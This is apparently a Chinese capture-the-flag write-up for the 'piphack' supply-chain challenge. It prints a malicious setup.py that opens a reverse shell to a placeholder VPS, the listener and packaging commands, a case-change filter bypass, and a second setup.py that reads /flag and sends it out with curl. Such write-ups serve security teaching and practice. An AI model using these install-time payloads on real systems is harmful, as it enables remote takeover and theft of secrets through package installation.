# piphack

> 分类：Misc（供应链）

## 题目描述

给了一个可以安装任意包的接口（pip 相关），通过构造恶意 pip 包（setup.py）实现命令执行。

## 考察知识点

- pip 供应链攻击（恶意 setup.py）
- 反弹 shell / curl 外带

## 解法

1. 创建一个恶意的 `setup.py`（借鉴 FakePip 方法），内含反弹 shell 或读取 flag 的命令：

```python
from setuptools import setup, find_packages
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<vps>", 8089))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/bash", "-i"])

setup(name="123", version="0.0.1", packages=find_packages(), install_requires=[])
```

2. 打包：

```shell
python3 setup.py sdist
```

3. 开启 web 端口供下载包：

```shell
python3 -m http.server 8080
```

4. 开启监听 shell 的端口（setup.py 里写的端口）：

```shell
nc -lvp 8089
```

5. 传入网址请求（http 要大小写绕过），反弹 shell 成功。

**另一方法**：用 git 方式从仓库拉取恶意脚本：

```python
import os
f = open('/flag', 'r').read()
os.system('curl http://<vps>:10010?' + f)
```

放到 Gitee 仓库，输入 `git+https://gitee.com/xxx/test.git` 即可运行 setup.py，vps 收到外带 flag。

## 参考答案

（flag 通过恶意 pip 包安装时反弹 shell 或外带读取）

## 来源

- 作者：Ten（Ahisec） | https://cn-sec.com/archives/1802791.html
- 作者：Lazzaro | https://lazzzaro.github.io/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/index.html
